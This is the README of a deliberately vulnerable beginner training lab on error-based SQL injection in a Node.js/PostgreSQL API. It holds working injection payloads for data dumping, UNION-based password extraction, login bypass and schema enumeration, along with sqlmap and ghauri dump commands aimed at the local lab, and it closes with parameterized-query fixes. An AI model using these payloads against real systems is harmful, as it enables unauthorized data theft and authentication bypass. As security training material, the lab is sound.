# Lab 01 — SQL Injection (Error-Based) 🔴

**Port:** `8001`  
**Stack:** Node.js + PostgreSQL  
**Difficulty:** Beginner

---

## 🕳️ Security Loopholes

### 1. Raw String Concatenation in SQL Queries
The API builds SQL queries using direct string interpolation:
```javascript
// VULNERABLE
const query = `SELECT * FROM users WHERE username = '${username}'`;
```
An attacker can inject arbitrary SQL by manipulating the `username` parameter.

### 2. Full Error Message Disclosure
When the query fails, the full PostgreSQL error (including the executed query) is returned to the client:
```json
{ "error": "syntax error at or near...", "query": "SELECT * FROM users WHERE..." }
```
This aids attackers in crafting precise injections.

### 3. Login Bypass via SQLi
The `/login` endpoint is also injectable, allowing authentication bypass without knowing any password.

---

## 🎯 Attack Scenarios

### Scenario A — User Enumeration + Data Dump
**Goal:** Extract all users and their `secret_notes` field.

```bash
# Start the lab
docker compose up -d

# Basic test — does it reflect input?
curl "http://localhost:8001/users/search?username=alice"

# Classic injection — dump all users
curl "http://localhost:8001/users/search?username=' OR '1'='1"

# UNION-based injection to extract additional data
curl -G "http://localhost:8001/users/search" \
  --data-urlencode "username=' UNION SELECT 1,username,email,password,secret_notes FROM users--"

# Using sqlmap for automated extraction
sqlmap -u "http://localhost:8001/users/search?username=alice" \
  --dbms=postgresql --dump --batch --level=3
```

### Scenario B — Authentication Bypass
**Goal:** Log in as admin without knowing the password.

```bash
# Login bypass — always-true condition
curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "anything"}'

# Alternative bypass
curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' OR 1=1 --", "password": "x"}'
```

### Scenario C — Extract Database Metadata
**Goal:** Map the entire database schema.

```bash
# Extract table names
curl -G "http://localhost:8001/users/search" \
  --data-urlencode "username=' UNION SELECT 1,table_name,table_schema,'x','x' FROM information_schema.tables--"

# Extract all column names
curl -G "http://localhost:8001/users/search" \
  --data-urlencode "username=' UNION SELECT 1,column_name,table_name,'x','x' FROM information_schema.columns WHERE table_name='users'--"
```

### Scenario D — Product Search Injection
```bash
# Inject via /products endpoint  
sqlmap -u "http://localhost:8001/products?name=widget" --dbms=postgresql --dump --batch

# Manual: expose internal_cost field (business logic leak)
curl -G "http://localhost:8001/products" \
  --data-urlencode "name='; SELECT name,price,internal_cost FROM products--"
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `sqlmap` | `sqlmap -u "http://localhost:8001/users/search?username=test" --dbms=postgresql --dump --batch` |
| `curl` | Manual payload injection |
| `Burp Suite` | Intercept and modify requests, use Intruder for payloads |
| `ghauri` | `ghauri -u "http://localhost:8001/users/search?username=test" --dbms=postgresql` |

---

## 🔐 How to Fix (Secure Code)

```javascript
// Use parameterized queries — ALWAYS
const query = 'SELECT id, username, email FROM users WHERE username = $1';
const result = await pool.query(query, [username]);

// Never return raw error objects
catch (err) {
  console.error(err); // Log server-side only
  res.status(500).json({ error: 'Internal server error' }); // Generic message
}
```

**Key fixes:**
- Parameterized queries / prepared statements
- Input validation and allowlisting
- Generic error messages
- Principle of least privilege for DB user
- Remove `secret_notes` from API responses entirely
